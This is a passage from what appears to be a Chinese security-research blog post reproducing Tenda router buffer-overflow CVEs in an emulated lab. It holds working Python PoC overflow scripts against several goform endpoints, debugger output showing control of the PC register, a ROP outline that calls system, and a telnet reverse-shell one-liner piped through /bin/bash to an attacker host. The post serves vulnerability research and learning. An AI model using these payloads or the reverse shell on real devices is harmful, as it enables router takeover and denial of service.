pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;192.168.85.131&#x27;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line">r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">li(<span class="string">&#x27;[+] connecting&#x27;</span>)</span><br><span class="line">r.connect((ip, port))</span><br><span class="line">li(<span class="string">&#x27;[+] connect finish&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rn = <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">p1 = cyclic(<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b&#x27;page=&#x27;</span> + p1</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b&quot;POST /goform/addressNat&quot;</span> + <span class="string">b&quot; HTTP/1.1&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Host: 192.168.0.1&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Accept-Language: en-US,en;q=0.5&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Accept-Encoding: gzip, deflate&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Cookie: password=hum1qw&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Connection: close&quot;</span> + rn</span><br><span class="line">p3 += <span class="string">b&quot;Upgrade-Insecure-Requests: 1&quot;</span> + rn</span><br><span class="line">p3 += (<span class="string">b&quot;Content-Length: %d&quot;</span> % <span class="built_in">len</span>(p2)) +rn</span><br><span class="line">p3 += <span class="string">b&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span>+rn</span><br><span class="line">p3 += rn</span><br><span class="line">p3 += p2</span><br><span class="line"></span><br><span class="line">li(<span class="string">&#x27;[+] sendling payload&#x27;</span>)</span><br><span class="line">r.send(p3)</span><br><span class="line"></span><br><span class="line">response = r.recv(<span class="number">4096</span>)</span><br><span class="line">response = response.decode()</span><br><span class="line">li(response)</span><br></pre></td></tr></table></figure>
+
+
+<p>动态调试</p>
+<p>qemu开启gdbserver</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo qemu-arm-static -g 1234 -L ./ ./bin/httpd</span><br></pre></td></tr></table></figure>
+
+<p>gdb attach</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gdb-mulitarch</span><br><span class="line">$ file bin/httpd</span><br><span class="line">$ b *0x00079F64</span><br></pre></td></tr></table></figure>
+
+<p>发送PoC，调试到漏洞出现的地方</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► 0x7a064 &lt;fromAddressNat+256&gt;    bl     <span class="comment">#sprintf@plt                       &lt;sprintf@plt&gt;</span></span><br><span class="line">       s: 0x4080010c ◂— 0x0</span><br><span class="line">       format: 0xe6054 ◂— <span class="string">&#x27;advance/addressNatList.asp?page=%s&#x27;</span></span><br><span class="line">       vararg: 0x125250 ◂— 0x61616161 (<span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在函数返回时，将pc赋值 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> ► 0x7a0c8 &lt;fromAddressNat+356&gt;    sub    sp, fp, <span class="comment">#8</span></span><br><span class="line">   0x7a0cc &lt;fromAddressNat+360&gt;    pop    &#123;r4, fp, pc&#125;</span><br><span class="line"></span><br><span class="line">// ...</span><br><span class="line">Invalid address 0x61616160</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="CVE-2023-27021"><a href="#CVE-2023-27021" class="headerlink" title="CVE-2023-27021"></a>CVE-2023-27021</h3><p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13506?time__1311=mqmxnQiQi=DQ0=GODlcIEHfh+fhfrD&alichlgref=https://cn.bing.com/#toc-5">路由器通用0day漏洞挖掘及RCE思路</a></p>
+<p>相同的固件，函数是 <code>formSetFirewallCfg</code></p>
+<p>PoC</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.85.131/goform/SetFirewallCfg&quot;</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;password=hamster&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">500</span></span><br><span class="line">data = &#123;<span class="string">&quot;firewallEn&quot;</span>: payload&#125;</span><br><span class="line">resp = requests.post(url, headers=header, data=data, timeout=<span class="number">5</span>)</span><br><span class="line">resp = requests.post(url, headers=header, data=data, timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure>
+
+<p>这两个漏洞都是可以控制函数执行流的，因此需要学习一下ROP是如何写</p>
+<ul>
+<li>libcbase: 在gdb里面vmmap一下</li>
+<li>ROP: 需要知道各个寄存器的作用</li>
+<li>路由器一般不支持bin&#x2F;bash命令，选择用telnet来getshell</li>
+</ul>
+<p>可以使用pop pc 来控制函数执行流</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop &#123;r3, pc&#125;</span><br><span class="line">r3_val: system_addr</span><br><span class="line">pc: 将地址改成下面指令地址</span><br><span class="line">	mov r0, sp // r0作为第一个参数</span><br><span class="line">	blx, r3</span><br></pre></td></tr></table></figure>
+
+<p>telnet 反弹shell</p>
+<ul>
+<li>telnet在攻击者主机x.x.x.x及port1开启监听用户，并将此处Telnet的标准输入通过管道符传给后面命令<code>/bin/bash</code>执行，再将<code>/bin/bash</code>的输出结果作为后面<code>telnet</code>的输入。此时通过两个端口，一个接收用户输入，通过<code>/bin/bash</code>处理后再由另一个端口输出。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># (x.x.x.x为攻击机ip)</span></span><br><span class="line">$ telnet x.x.x.x 6666 | /bin/bash | telnet x.x.x.x 5555</span><br><span class="line"><span class="comment"># 我们监听5555端口</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h3><p>难点在于</p>
+<ul>
+<li>寻找：找到漏洞点</li>
+<li>交互：用户如何走到漏洞代码</li>
+<li>调试：验证，以及是否可以劫持函数执行流</li>
+</ul>
+<p>从http开始，寻找危险函数，如果能挖到漏洞向cve官网提交</p>
+<p>从上往下一个个看</p>
+<ul>
+<li>用户可控：由用户输入</li>
+<li>存在危险函数调用</li>
+</ul>
+<p>strcpy&#x2F;memcpy，但是找到的大部分都存在编号</p>
+<ul>
+<li>form_fast_setting_wifi_set</li>
+<li>fromSetIpMacBind</li>
+<li>SetSysTimeCfg</li>
+<li>fromSetSysTime</li>
+<li>setSchedWifi</li>
+</ul>
+<p>formWifiBasicSet 在 <code>V15.03.05.18</code> 存在CVE编号，但是作者只写了一个，但是存在两个漏洞点</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Amalll/p/16527552.html">CVE-2022-37175</a>利用的是 <code>security_5g</code> 但是这里还可以使用 <code>security</code></p>
+<ul>
+<li>申请了，失败了，重复项，看来不是捡漏😢，就当复现了</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">formWifiBasicSet</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  wrlEn = (<span class="type">char</span> *)<span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;wrlEn&quot;</span>, (<span class="type">int</span>)&amp;byte_EF0B8);</span><br><span class="line">  hideSsid = <span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;hideSsid&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;0&quot;</span>);</span><br><span class="line">  ssid = (<span class="type">int</span>)<span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;ssid&quot;</span>, (<span class="type">int</span>)&amp;unk_EFE58);</span><br><span class="line">  security = (<span class="type">char</span> *)<span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;security&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;none&quot;</span>);</span><br><span class="line">  wrlPwd = <span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;wrlPwd&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;12345678&quot;</span>);</span><br><span class="line">  wrlEn_5g = (<span class="type">char</span> *)<span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;wrlEn_5g&quot;</span>, (<span class="type">int</span>)&amp;byte_EF0B8);</span><br><span class="line">  hideSsid_5g = <span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;hideSsid_5g&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;0&quot;</span>);</span><br><span class="line">  ssid_5g = (<span class="type">int</span>)<span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;ssid_5g&quot;</span>, (<span class="type">int</span>)&amp;unk_EFE58);</span><br><span class="line">  security_5g = (<span class="type">char</span> *)<span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;security_5g&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;none&quot;</span>);</span><br><span class="line">  wrlPwd_5g = <span class="built_in">websGetVar</span>(a1, (<span class="type">int</span>)<span class="string">&quot;wrlPwd_5g&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;12345678&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !hideSsid || !ssid || !security || !wrlPwd || !hideSsid_5g || !ssid_5g || !security_5g || !wrlPwd_5g )</span><br><span class="line">  &#123;</span><br><span class="line">    v57 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_96;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_9CD24</span>(<span class="string">&quot;wl2g.ssidxx.ssid&quot;</span>, ssid, v48, v47);</span><br><span class="line">    v6 = <span class="built_in">sub_8F234</span>(<span class="string">&quot;wl2g.ssidxx.security&quot;</span>, v48, v47);</span><br><span class="line">    <span class="built_in">GetValue</span>(v6, (<span class="type">char</span> *)v47 + <span class="number">256</span>);</span><br><span class="line">    <span class="built_in">SetValue</span>((<span class="type">int</span>)v47, (<span class="type">int</span>)security);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(security, <span class="string">&quot;wpapsk&quot;</span>) || !<span class="built_in">strcmp</span>(security, <span class="string">&quot;wpa2psk&quot;</span>) || !<span class="built_in">strcmp</span>(security, <span class="string">&quot;wpawpa2psk&quot;</span>) )</span><br><span class="line">      <span class="built_in">SetValue</span>((<span class="type">int</span>)v47, (<span class="type">int</span>)<span class="string">&quot;wpapsk&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">SetValue</span>((<span class="type">int</span>)v47, (<span class="type">int</span>)security);</span><br><span class="line">    <span class="built_in">strcpy</span>(s, security);</span><br><span class="line">    <span class="comment">// 经过调试，上面的buffer overflow 可以覆盖 v48 和 v49 这两个变量，从而造成DoS</span></span><br><span class="line">    v7 = <span class="built_in">sub_8F234</span>(<span class="string">&quot;wl2g.ssidxx.wpapsk_type&quot;</span>, v48, v47);   </span><br></pre></td></tr></table></figure>
+
+
+<p>覆盖栈上的变量，导致函数调用时crash，PoC</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">url = <span class="string">b&quot;http://192.168.85.131/login/Auth&quot;</span></span><br><span class="line">vuln = <span class="string">b&quot;http://192.168.85.131/goform/WifiBasicSet/&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#  0xdeadbeef</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x13c</span> + (<span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>) + (<span class="string">&#x27;c&#x27;</span> * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">vuln_data = &#123;</span><br><span class="line">    <span class="string">&quot;security&quot;</span>: payload,</span><br><span class="line">    <span class="string">&quot;hideSsid&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ssid&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;security_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wrlPwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hideSsid_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ssid_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wrlPwd_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vuln_data_5g = &#123;</span><br><span class="line">    <span class="string">&quot;security_5g&quot;</span>: payload,</span><br><span class="line">    <span class="string">&quot;hideSsid&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ssid&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;security&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wrlPwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hideSsid_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ssid_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wrlPwd_5g&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    s = requests.session()</span><br><span class="line">    resp = s.post(url=url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(resp.content)</span><br><span class="line">    resp = s.post(url=vuln, data=vuln_data)</span><br><span class="line">    <span class="built_in">print</span>(resp.content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack_5g</span>():</span><br><span class="line">    s = requests.session()</span><br><span class="line">    resp = s.post(url=url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(resp.content)</span><br><span class="line">    resp = s.post(url=vuln, data=vuln_data_5g)</span><br><span class="line">    <span class="built_in">print</span>(resp.content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">attack()</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="more"><a href="#more" class="headerlink" title="more"></a>more</h2><p>IDA漏洞扫描插件：<a target="_blank" rel="noopener" href="https://github.com/Accenture/VulFi">VulFi: IDA Pro plugin for query based searching within the binary useful mainly for vulnerability research</a></p>
+<p>工具安装：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/Accenture/VulFi</span><br></pre></td></tr></table></figure>
+
+<p>然后将某些文件其放在ida&#x2F;plugins目录下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cp</span> vulfi.py vulfi_prototypes.json vulfi_rules.json ~/~/idafree-8.4/plugins</span><br></pre></td></tr></table></figure>
+
+<p>在search栏就能找到 <code>VulFi</code> 图标</p>
+<p>写自己的规则：将alt_names 改成自己的列表就行，可以参考默认的。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RULE NAME&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;alt_names&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;function_name_to_look_for&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;wrappers&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;mark_if&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;High&quot;</span><span class="punctuation">:</span><span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Medium&quot;</span><span class="punctuation">:</span><span class="string">&quot;False&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Low&quot;</span><span class="punctuation">:</span> <span class="string">&quot;False&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/Ha0-Y">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">1.</span> <span class="toc-text">环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8C%85"><span class="toc-number">1.1.</span> <span class="toc-text">固件解包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BF%E7%9C%9F"><span class="toc-number">1.2.</span> <span class="toc-text">仿真</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#qemu-user"><span class="toc-number">1.2.1.</span> <span class="toc-text">qemu-user</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#qemu-system"><span class="toc-number">1.2.2.</span> <span class="toc-text">qemu-system</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E7%BD%91%E6%A1%A5"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">搭建网桥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#chroot"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">chroot</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FAT"><span class="toc-number">1.2.3.</span> <span class="toc-text">FAT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unicorn"><span class="toc-number">1.2.4.</span> <span class="toc-text">Unicorn</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Qiling"><span class="toc-number">1.2.5.</span> <span class="toc-text">Qiling</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E8%AF%91ghidra"><span class="toc-number">2.</span> <span class="toc-text">编译ghidra</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9B%BA%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">获取固件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA-plugins"><span class="toc-number">4.</span> <span class="toc-text">IDA plugins</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tenda"><span class="toc-number">5.</span> <span class="toc-text">tenda</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2018-18708"><span class="toc-number">5.1.</span> <span class="toc-text">CVE-2018-18708</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2023-27021"><span class="toc-number">5.2.</span> <span class="toc-text">CVE-2023-27021</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95"><span class="toc-number">5.3.</span> <span class="toc-text">尝试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#more"><span class="toc-number">6.</span> <span class="toc-text">more</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ha0-y.github.io/2024/03/21/Tenda-CVE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ha0-y.github.io/2024/03/21/Tenda-CVE/&text=Tenda-cve"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ha0-y.github.io/2024/03/21/Tenda-CVE/&title=Tenda-cve"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ha0-y.github.io/2024/03/21/Tenda-CVE/&is_video=false&description=Tenda-cve"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tenda-cve&body=Check out this article: https://ha0-y.github.io/2024/03/21/Tenda-CVE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ha0-y.github.io/2024/03/21/Tenda-CVE/&title=Tenda-cve"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ha0-y.github.io/2024/03/21/Tenda-CVE/&title=Tenda-cve"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ha0-y.github.io/2024/03/21/Tenda-CVE/&title=Tenda-cve"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ha0-y.github.io/2024/03/21/Tenda-CVE/&title=Tenda-cve"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ha0-y.github.io/2024/03/21/Tenda-CVE/&name=Tenda-cve&description=&lt;blockquote&gt;
+&lt;p&gt;IoT简易入门&lt;/p&gt;
+&lt;/blockquote&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ha0-y.github.io/2024/03/21/Tenda-CVE/&t=Tenda-cve"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2024
+    h4m5ter
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Ha0-Y">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
